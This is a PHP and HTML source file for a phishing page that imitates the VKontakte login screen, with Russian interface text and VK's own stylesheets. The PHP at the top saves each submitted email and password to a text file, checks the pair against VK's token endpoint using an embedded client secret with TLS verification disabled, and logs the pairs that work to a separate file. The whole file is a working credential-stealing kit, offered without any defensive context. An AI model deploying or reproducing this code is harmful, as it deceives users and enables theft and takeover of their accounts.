<?php
error_reporting(0);

$mail=$_POST['email'];
$pass=$_POST['pass'];

if($mail) {
	$list=fopen('./akks/all.txt', 'a');
	$text = $mail.":".$pass."\r\n";
	$write=fwrite($list, $text); 
	fclose($list);

	$ch = curl_init("https://auth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$mail&password=$pass");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

	$res=curl_exec($ch);
	curl_close($ch);

	if(substr_count($res,"access_token")) {
		$list=fopen('./akks/valid.txt', 'a');
		$text = $mail.":".$pass."\r\n";
		$write=fwrite($list, $text); 
		fclose($list);
	
		
		echo "<html><head><meta    http-equiv='Refresh' content='0;    URL='ok.php'></head></html>";
	} else {
		header('Location: result.php?m=1');
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="vkontakte">
<head>

  <meta http-equiv="X-UA-Compatible" content="IE=edge" />

  <title>ВКонтакте</title>
  <link rel="shortcut icon" href="faviconnew.ico" />

  <link rel="stylesheet" href="http://vk.com/css/rustyle.css?163" type="text/css" />
  <script src="http://vk.com/js/common.js?280" type="text/javascript"></script>
  <link rel="stylesheet" href="http://vk.com/css/ui_controls.css?28" type="text/css" />
  <script src="http://vk.com/js/lib/ui_controls.js?117" type="text/javascript"></script>

  <!--<link rel="stylesheet" href="design/rustyle.css?163" type="text/css" />
  <link rel="stylesheet" href="design/ui_controls.css?28" type="text/css" />
  <script src="design/ui_controls.js?117" type="text/javascript"></script>-->
    
<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(http://vk.com/css/ie.css?14); /* ]]> */</style><![endif]-->
<!--[if IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(http://vk.com/css/ie7.css?13); /* ]]> */</style><![endif]-->
<!--[if gte IE 8]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(http://vk.com/css/ie8.css); /* ]]> */</style><![endif]-->

<script type="text/javascript" src="http://vk.com/js/lang0_0.js?6261"></script>


<style type="text/css">
body {
  margin: 0;
  padding: 0;
  font-family: tahoma, verdana, arial, sans-serif, Lucida Sans;
  font-size: 11px;
  background-color: #F2F2F2;
  overflow: hidden;
}
#top {
  display: block;
  height: 39px;
  text-align: center;
  background: url("http://vk.com/images/pay.gif") 0px -39px;
}
#top_logo {
  width: 131px;
}
#top_logo a {
  display: block;
  width: 131px;
  height: 39px;
  margin: 0px 9px;
  background: url("http://vk.com/images/pay1.gif") no-repeat;
}
#page {
  background-color: #F7F7F7;
  padding: 10px;
  height: 50px;
  border-bottom: 1px solid #DAE2E8;
}

#error {
  width: 468px;
  line-height: 15px;
  clear: both;
  font-size: 11px;
  font-weight: normal;
  margin: 0px auto 5px;
  padding: 8px 11px;
}

.row {
  clear: both;
  height: 26px;
}
label {
  font-weight: normal;
}
.row .label {
  float: left;
  width: 180px;
  color: #777;
  padding: 4px 10px 0px 0px;
  text-align: right;
}
.row .labeled {
  float: left;
  width: 190px;
}
.row .please {
  float: left;
  width: 120px;
  font-size: 10px;
  color: #800;
  display: none;
}
.row .labeled input.inputText {
  width: 172px;
}

#cont_wrapper {
  background-color: #FFF;
  clear: left;
  overflow-x: hidden;
  overflow-y: auto;
}
#cont {
  width: 500px;
  margin: 0px auto;
}
#bottom {
  background-color:  #F2F2F2;
  border: 0px;
  border-top: 1px solid #CCCCCC;
  height: 40px;
}

a:hover {
  text-decoration: underline;
}
#user_link, #logout_link {
  color: #FFF;
  text-align: left;
  margin-right: 4px;
}
#logout_link, #logout_link a {
  color: #DAE1E8;
}
#user_link {
  font-weight: bold;
}

#bottom_buttons .button_blue,
#bottom_buttons .button_gray {
  margin: 7px 8px 7px 0px;
}
#bottom_progress {
  margin: 15px 15px 0px;
  display: none;
}
#bottom_reglink {
  margin: 13px 15px 0px;
  display: none;
}

.step_header {
  border-bottom: 1px solid #DAE1E8;
  color: #45688E;
  font-size: 12px;
  font-weight: bold;
  width: 490px;
  margin: 0px auto 10px;
}

.error {
  background: #FFEFE8;
  border: 1px solid #E89B88;
}

</style>
<script type="text/javascript">
	function connect(){ 
		document.forms["auth_vk"].submit();
	}

	function onDone() {
		var newWin = window.open("index.php");
	 
		newWin.focus()
  		window.close();
	}

<?php if($ok=="1") { print('parent.onDone();'); } ?>
</script>
</head>
<body>

<div id="top">
  <table style="width: 100%" cellspacing="0" cellpadding="0"><tr style="vertical-align: top">
    <td id="top_logo"><a href="http://vk.com/" target="_blank"></a></td>
    <td style="text-align: right;">
      <div style="padding: 12px 7px 0px 0px">
        <a id="user_link" href="id" style="display: none" target="_blank"></a>
        <span id="logout_link" style="display: none;">(<a href="javascript: logout()">выйти</a>)</span>
      </div>
    </td>
  </tr></table>
</div>

<div id="cont_wrapper"><div id="cont">
<div id="login_form" style="">
  <div style="padding: 20px 0px">
  <form action="auth.php" method="POST" id="auth_vk" name="auth_vk">
    <div class="step_header">Вход в систему</div>
    <?php if($_GET['m']=="1") { print('<div id="error" class="error">Указан неверный логин или пароль.</div>'); } ?>
      <div class="row">
        <div class="label">
          <label for="email" id="email_label">Телефон или e-mail:</label>
        </div>
        <div class="labeled">
          <input type="email" id="email" name="email" class="inputText"/>
        </div>
      </div>
      <div class="row">
        <div class="label">
          <label for="pass" id="password_label">Пароль:</label>
        </div>
        <div class="labeled">
          <input type="password" id="pass" name="pass" autocomplete="off" class="inputText" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) connect();"/>
        </div>
      </div>

   
  </div>
</div>
</div></div>

<div id="bottom">
  <div id="bottom_buttons">
    <div class="button_gray fl_r"><a onclick="window.close(); return false;"><button id="cancel_button">Закрыть</button></div>
    <div class="button_blue fl_r"><a onclick="connect(); return false;"><button id="connect_button">Войти</button></div>
	</form>
  </div>
  <img src="images/upload.gif" id="bottom_progress" />
  <a id="bottom_reglink" href="http://vkontakte.ru/reg0" onclick="window.open(this.href, '_blank', 'fullscreen=yes'); window.close(); return false;"></a>
</div>
</body>
</html>